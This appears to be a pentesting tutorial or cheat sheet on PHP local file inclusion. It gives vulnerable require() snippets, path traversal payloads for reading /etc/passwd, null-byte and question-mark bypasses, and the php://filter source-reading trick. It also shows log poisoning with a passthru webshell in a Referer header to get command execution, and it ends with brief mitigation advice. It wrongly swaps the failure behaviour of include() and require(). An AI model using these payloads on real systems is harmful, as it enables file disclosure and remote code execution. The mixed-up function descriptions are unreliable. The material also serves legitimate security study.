# LFI Local File Inclusion

> Local File Inclusion is a vulnerability that occurs when  the web application allows the user to submit input into files or upload files to the server. In some cases the attacker is able to run arbitrary code on the server .

## Impact 
1. Sensitive Information Disclosure (e.g reading /etc/passwd file , getting useful information from the log files such as : /apache/logs/access.log) 
2. Code execution on the web server 

## Exploitation examples 

In php to include files there is some function can be used like : 
- **include()**:  if fill not found it will produce a fatal error (E_COMPILE_ERROR) and stop the script
- **require()**:  if fill not found it will only produce a warning (E_WARNING) and the script will continue

**Example 1**
```
<?php
$file = $_GET['page'];
require($file);
?>
```

The above code snippet is a basic example for file inclusion , the user will send a page parameter which will be used as input for the require() function .

The attacker can send the path of linux passwd file e.g `http://example.com/main/?page=../../../../../etc/passwd`

This will allow him to read the `/etc/passwd` file contents.

**Example 2**
```
<?php
$file = $_GET['page'];
require($file."php");
?>
```

In the above code , the developer added the php extension to the file name .

So in the basic testing if you send `/etc/passwd` , the _require()_ function will look for `/etc/passwd.php` which does not exist in the system.

Some bypassing techniques include :
1. Null byte %00

	The null byte indicates the ending of the string which will make the web server ignore the php extension .

	e.g http://example.com/?page=../../../etc/passwd%00 

2. Adding a question mark (?)

	The question mark will make the web server consider any value as a parameter after our path .

	e.g http://example.com?page=../../../etc/passwd?

So the `.php` will be considered as a parameter :
```
require("../../../etc/passwd?.php");
```

**Example 3**

If LFI is found in the web application you can try to read the source code by converting the data to a base64 format using the PHP wrapper .

e.g `php://filter/convert.base64-encode/resource=index.php`

This payload output will be a base64 encoded data which you can decode it using burp suite decoder or within your terminal type the following
```
echo base64_encoded_data | base64 -d
```

**Example 4**

**LFI to Shell**

In some cases you will be able to get a shell from an LFI .

	- Log poisoning : In this technique there are some requirements needed .

		-	First one , is to know the exact path of the log files , you need to know what web server is being used (e.g nginx , apache) then you can easily know logs path (e.g /var/logs/apache2/access.log) 
		- Second one , is to inject the php code into one of the common headers , so that it can be replaced inside the log file of the server .
		- The final step is to include that file , and for sure you will use the LFI vulnerable point you found in the web application .

e.g : you can intercept the request and inject something like the following  :
```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: example.com
Connection: close
```

And from the vulnerable point send your payload , 
```
http://example.com/home/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

And in some cases you will be able to use the data wrapper which will make it easier to get a shell e.g data://text/plain, payload 
```
http://www.example.com/?page=data://text/plain, 
cmd=whoami
```

## Mitigation
1. Input validation is needed : you need to validate the user input to avoid any chances for LFI/RFI attacks
2. Disable **allow_url_fopen** and **allow_url_include** if they are not needed in the web application .

